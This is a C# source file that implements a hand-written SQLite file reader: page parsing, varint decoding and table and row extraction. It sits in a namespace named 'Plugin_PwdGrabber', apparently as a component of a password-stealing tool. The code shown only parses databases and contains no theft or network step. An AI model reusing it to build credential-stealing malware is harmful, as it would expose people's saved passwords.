    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.IO;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Text;

namespace Plugin_PwdGrabber
{
    public class SQLiteWrapper
    {
        private byte[] db_bytes;
        private ulong encoding;
        private string[] field_names;
        private sqlite_master_entry[] master_table_entries;
        private ushort page_size;
        private byte[] SQLDataTypeSize = new byte[] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
        private table_entry[] table_entries;

        [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
        public SQLiteWrapper(string baseName)
        {
            if (File.Exists(baseName))
            {
                FileSystem.FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
                string asi = Strings.Space((int)FileSystem.LOF(1));
                FileSystem.FileGet(1, ref asi, -1L, false);
                FileSystem.FileClose(new int[] { 1 });
                this.db_bytes = Encoding.Default.GetBytes(asi);
                this.page_size = (ushort)this.ConvertToInteger(0x10, 2);
                this.encoding = this.ConvertToInteger(0x38, 4);
                if (decimal.Compare(new decimal(this.encoding), decimal.Zero) == 0)
                {
                    this.encoding = 1L;
                }
                this.ReadMasterTable(100L);
            }
        }

        private ulong ConvertToInteger(int startIndex, int Size)
        {
            if ((Size > 8) | (Size == 0))
            {
                return 0L;
            }
            ulong retVal = 0L;
            int TempLength = Size - 1;
            for (int i = 0; i <= TempLength; i++)
            {
                retVal = (retVal << 8) | this.db_bytes[startIndex + i];
            }
            return retVal;
        }

        private long CVL(int startIndex, int endIndex)
        {
            endIndex++;
            byte[] retus = new byte[8];
            int Length = endIndex - startIndex;
            bool Bit64 = false;
            if ((Length == 0) | (Length > 9))
            {
                return 0L;
            }
            if (Length == 1)
            {
                retus[0] = (byte)(this.db_bytes[startIndex] & 0x7f);
                return BitConverter.ToInt64(retus, 0);
            }
            if (Length == 9)
            {
                Bit64 = true;
            }
            int j = 1;
            int k = 7;
            int y = 0;
            if (Bit64)
            {
                retus[0] = this.db_bytes[endIndex - 1];
                endIndex--;
                y = 1;
            }
            int TempLength = startIndex;
            for (int i = endIndex - 1; i >= TempLength; i += -1)
            {
                if ((i - 1) >= startIndex)
                {
                    retus[y] = (byte)((((byte)(this.db_bytes[i] >> ((j - 1) & 7))) & (((int)0xff) >> j)) | ((byte)(this.db_bytes[i - 1] << (k & 7))));
                    j++;
                    y++;
                    k--;
                }
                else if (!Bit64)
                {
                    retus[y] = (byte)(((byte)(this.db_bytes[i] >> ((j - 1) & 7))) & (((int)0xff) >> j));
                }
            }
            return BitConverter.ToInt64(retus, 0);
        }

        public int GetRowCount()
        {
            return this.table_entries.Length;
        }

        public string[] GetTableNames()
        {
            string[] retVal = null;
            int arr = 0;
            int TempLength = this.master_table_entries.Length - 1;
            for (int i = 0; i <= TempLength; i++)
            {
                if (this.master_table_entries[i].item_type == "table")
                {
                    retVal = (string[])Utils.CopyArray((Array)retVal, new string[arr + 1]);
                    retVal[arr] = this.master_table_entries[i].item_name;
                    arr++;
                }
            }
            return retVal;
        }

        public string GetValue(int row_num, int field)
        {
            if (row_num >= this.table_entries.Length)
            {
                return null;
            }
            if (field >= this.table_entries[row_num].content.Length)
            {
                return null;
            }
            return this.table_entries[row_num].content[field];
        }

        public string GetValue(int row_num, string field)
        {
            int found = -1;
            int TempLength = this.field_names.Length;
            for (int i = 0; i <= TempLength; i++)
            {
                if (this.field_names[i].ToLower().CompareTo(field.ToLower()) == 0)
                {
                    found = i;
                    break;
                }
            }
            if (found == -1)
            {
                return null;
            }
            return this.GetValue(row_num, found);
        }

        private int GVL(int startIndex)
        {
            if (startIndex > this.db_bytes.Length)
            {
                return 0;
            }
            int TempLength = startIndex + 8;
            for (int i = startIndex; i <= TempLength; i++)
            {
                if (i > (this.db_bytes.Length - 1))
                {
                    return 0;
                }
                if ((this.db_bytes[i] & 0x80) != 0x80)
                {
                    return i;
                }
            }
            return (startIndex + 8);
        }

        private bool IsOdd(long value)
        {
            return ((value & 1L) == 1L);
        }

        private void ReadMasterTable(ulong Offset)
        {
            if (this.db_bytes[(int)Offset] == 13)
            {
                ushort Length = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int ol = 0;
                if (this.master_table_entries != null)
                {
                    ol = this.master_table_entries.Length;
                    this.master_table_entries = (sqlite_master_entry[])Utils.CopyArray((Array)this.master_table_entries, new sqlite_master_entry[(this.master_table_entries.Length + Length) + 1]);
                }
                else
                {
                    this.master_table_entries = new sqlite_master_entry[Length + 1];
                }
                int TempLength = Length;
                for (int i = 0; i <= TempLength; i++)
                {
                    ulong ent_offset = this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) != 0)
                    {
                        ent_offset += Offset;
                    }
                    int t = this.GVL((int)ent_offset);
                    long size = this.CVL((int)ent_offset, t);
                    int s = this.GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ent_offset), decimal.Subtract(new decimal(t), new decimal(ent_offset))), decimal.One)));
                    this.master_table_entries[ol + i].row_id = this.CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ent_offset), decimal.Subtract(new decimal(t), new decimal(ent_offset))), decimal.One)), s);
                    ent_offset = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(ent_offset), decimal.Subtract(new decimal(s), new decimal(ent_offset))), decimal.One));
                    t = this.GVL((int)ent_offset);
                    s = t;
                    long Rec_Header_Size = this.CVL((int)ent_offset, t);
                    long[] Field_Size = new long[5];
                    int j = 0;
                    do
                    {
                        t = s + 1;
                        s = this.GVL(t);
                        Field_Size[j] = this.CVL(t, s);
                        if (Field_Size[j] > 9L)
                        {
                            if (this.IsOdd(Field_Size[j]))
                            {
                                Field_Size[j] = (long)Math.Round((double)(((double)(Field_Size[j] - 13L)) / 2.0));
                            }
                            else
                            {
                                Field_Size[j] = (long)Math.Round((double)(((double)(Field_Size[j] - 12L)) / 2.0));
                            }
                        }
                        else
                        {
                            Field_Size[j] = this.SQLDataTypeSize[(int)Field_Size[j]];
                        }
                        j++;
                    }
                    while (j <= 4);
                    if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
                    {
                        this.master_table_entries[ol + i].item_type = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(ent_offset), new decimal(Rec_Header_Size))), (int)Field_Size[0]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
                    {
                        this.master_table_entries[ol + i].item_type = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(ent_offset), new decimal(Rec_Header_Size))), (int)Field_Size[0]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
                    {
                        this.master_table_entries[ol + i].item_type = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(ent_offset), new decimal(Rec_Header_Size))), (int)Field_Size[0]);
                    }
                    if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
                    {
                        this.master_table_entries[ol + i].item_name = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ent_offset), new decimal(Rec_Header_Size)), new decimal(Field_Size[0]))), (int)Field_Size[1]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
                    {
                        this.master_table_entries[ol + i].item_name = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ent_offset), new decimal(Rec_Header_Size)), new decimal(Field_Size[0]))), (int)Field_Size[1]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
                    {
                        this.master_table_entries[ol + i].item_name = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ent_offset), new decimal(Rec_Header_Size)), new decimal(Field_Size[0]))), (int)Field_Size[1]);
                    }
                    this.master_table_entries[ol + i].root_num = (long)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(ent_offset), new decimal(Rec_Header_Size)), new decimal(Field_Size[0])), new decimal(Field_Size[1])), new decimal(Field_Size[2]))), (int)Field_Size[3]);
                    if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
                    {
                        this.master_table_entries[ol + i].sql_statement = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(ent_offset), new decimal(Rec_Header_Size)), new decimal(Field_Size[0])), new decimal(Field_Size[1])), new decimal(Field_Size[2])), new decimal(Field_Size[3]))), (int)Field_Size[4]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
                    {
                        this.master_table_entries[ol + i].sql_statement = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(ent_offset), new decimal(Rec_Header_Size)), new decimal(Field_Size[0])), new decimal(Field_Size[1])), new decimal(Field_Size[2])), new decimal(Field_Size[3]))), (int)Field_Size[4]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
                    {
                        this.master_table_entries[ol + i].sql_statement = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(ent_offset), new decimal(Rec_Header_Size)), new decimal(Field_Size[0])), new decimal(Field_Size[1])), new decimal(Field_Size[2])), new decimal(Field_Size[3]))), (int)Field_Size[4]);
                    }
                }
            }
            else if (this.db_bytes[(int)Offset] == 5)
            {
                ushort Length = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int TempLengthTwo = Length;
                for (int i = 0; i <= TempLengthTwo; i++)
                {
                    ushort ent_offset = (ushort)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(i * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) == 0)
                    {
                        this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(ent_offset, 4)), decimal.One), new decimal(this.page_size))));
                    }
                    else
                    {
                        this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger((int)(Offset + ent_offset), 4)), decimal.One), new decimal(this.page_size))));
                    }
                }
                this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)), decimal.One), new decimal(this.page_size))));
            }
        }

        public bool ReadTable(string TableName)
        {
            int found = -1;
            int TempLength = this.master_table_entries.Length;
            for (int i = 0; i <= TempLength; i++)
            {
                if (this.master_table_entries[i].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
                {
                    found = i;
                    break;
                }
            }
            if (found == -1)
            {
                return false;
            }
            string[] fields = this.master_table_entries[found].sql_statement.Substring(this.master_table_entries[found].sql_statement.IndexOf("(") + 1).Split(new char[] { ',' });
            int TempLengthTwo = fields.Length - 1;
            for (int i = 0; i <= TempLengthTwo; i++)
            {
                fields[i] = Strings.LTrim(fields[i]);
                int index = fields[i].IndexOf(" ");
                if (index > 0)
                {
                    fields[i] = fields[i].Substring(0, index);
                }
                if (fields[i].IndexOf("UNIQUE") == 0)
                {
                    break;
                }
                this.field_names = (string[])Utils.CopyArray((Array)this.field_names, new string[i + 1]);
                this.field_names[i] = fields[i];
            }
            return this.ReadTableFromOffset((ulong)((this.master_table_entries[found].root_num - 1L) * this.page_size));
        }

        private bool ReadTableFromOffset(ulong Offset)
        {
            if (this.db_bytes[(int)Offset] == 13)
            {
                ushort Length = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int ol = 0;
                if (this.table_entries != null)
                {
                    ol = this.table_entries.Length;
                    this.table_entries = (table_entry[])Utils.CopyArray((Array)this.table_entries, new table_entry[(this.table_entries.Length + Length) + 1]);
                }
                else
                {
                    this.table_entries = new table_entry[Length + 1];
                }
                int TempLength = Length;
                for (int i = 0; i <= TempLength; i++)
                {
                    record_header_field[] Field_Size = null;
                    ulong ent_offset = this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) != 0)
                    {
                        ent_offset += Offset;
                    }
                    int t = this.GVL((int)ent_offset);
                    long size = this.CVL((int)ent_offset, t);
                    int s = this.GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ent_offset), decimal.Subtract(new decimal(t), new decimal(ent_offset))), decimal.One)));
                    this.table_entries[ol + i].row_id = this.CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ent_offset), decimal.Subtract(new decimal(t), new decimal(ent_offset))), decimal.One)), s);
                    ent_offset = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(ent_offset), decimal.Subtract(new decimal(s), new decimal(ent_offset))), decimal.One));
                    t = this.GVL((int)ent_offset);
                    s = t;
                    long Rec_Header_Size = this.CVL((int)ent_offset, t);
                    long size_read = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(ent_offset), new decimal(t)), decimal.One));
                    for (int j = 0; size_read < Rec_Header_Size; j++)
                    {
                        Field_Size = (record_header_field[])Utils.CopyArray((Array)Field_Size, new record_header_field[j + 1]);
                        t = s + 1;
                        s = this.GVL(t);
                        Field_Size[j].type = this.CVL(t, s);
                        if (Field_Size[j].type > 9L)
                        {
                            if (this.IsOdd(Field_Size[j].type))
                            {
                                Field_Size[j].size = (long)Math.Round((double)(((double)(Field_Size[j].type - 13L)) / 2.0));
                            }
                            else
                            {
                                Field_Size[j].size = (long)Math.Round((double)(((double)(Field_Size[j].type - 12L)) / 2.0));
                            }
                        }
                        else
                        {
                            Field_Size[j].size = this.SQLDataTypeSize[(int)Field_Size[j].type];
                        }
                        size_read = (size_read + (s - t)) + 1L;
                    }
                    this.table_entries[ol + i].content = new string[(Field_Size.Length - 1) + 1];
                    int counter = 0;
                    int TempLengthTwo = Field_Size.Length - 1;
                    for (int k = 0; k <= TempLengthTwo; k++)
                    {
                        if (Field_Size[k].type > 9L)
                        {
                            if (!this.IsOdd(Field_Size[k].type))
                            {
                                if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
                                {
                                    this.table_entries[ol + i].content[k] = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ent_offset), new decimal(Rec_Header_Size)), new decimal(counter))), (int)Field_Size[k].size);
                                }
                                else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
                                {
                                    this.table_entries[ol + i].content[k] = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ent_offset), new decimal(Rec_Header_Size)), new decimal(counter))), (int)Field_Size[k].size);
                                }
                                else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
                                {
                                    this.table_entries[ol + i].content[k] = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ent_offset), new decimal(Rec_Header_Size)), new decimal(counter))), (int)Field_Size[k].size);
                                }
                            }
                            else
                            {
                                this.table_entries[ol + i].content[k] = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ent_offset), new decimal(Rec_Header_Size)), new decimal(counter))), (int)Field_Size[k].size);
                            }
                        }
                        else
                        {
                            this.table_entries[ol + i].content[k] = Conversions.ToString(this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ent_offset), new decimal(Rec_Header_Size)), new decimal(counter))), (int)Field_Size[k].size));
                        }
                        counter += (int)Field_Size[k].size;
                    }
                }
            }
            else if (this.db_bytes[(int)Offset] == 5)
            {
                ushort Length = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int TempLengthThree = Length;
                for (int i = 0; i <= TempLengthThree; i++)
                {
                    ushort ent_offset = (ushort)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(i * 2))), 2);
                    this.ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger((int)(Offset + ent_offset), 4)), decimal.One), new decimal(this.page_size))));
                }
                this.ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)), decimal.One), new decimal(this.page_size))));
            }
            return true;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct record_header_field
        {
            public long size;
            public long type;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct sqlite_master_entry
        {
            public long row_id;
            public string item_type;
            public string item_name;
            public string astable_name;
            public long root_num;
            public string sql_statement;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct table_entry
        {
            public long row_id;
            public string[] content;
        }
    }
}